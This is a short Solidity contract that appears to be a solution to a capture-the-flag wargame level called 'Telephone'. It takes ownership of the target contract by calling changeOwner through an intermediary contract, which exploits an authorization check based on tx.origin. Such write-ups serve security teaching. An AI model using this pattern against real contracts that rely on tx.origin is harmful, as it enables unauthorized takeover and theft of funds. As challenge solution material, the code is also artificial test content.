// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/4_ITelephone.sol";

contract TelephoneSolution {
    ITelephone instance;

    constructor(address _instance) {
        instance = ITelephone(_instance);
    }

    function solve(address _owner) external {
        instance.changeOwner(_owner);
    }
}
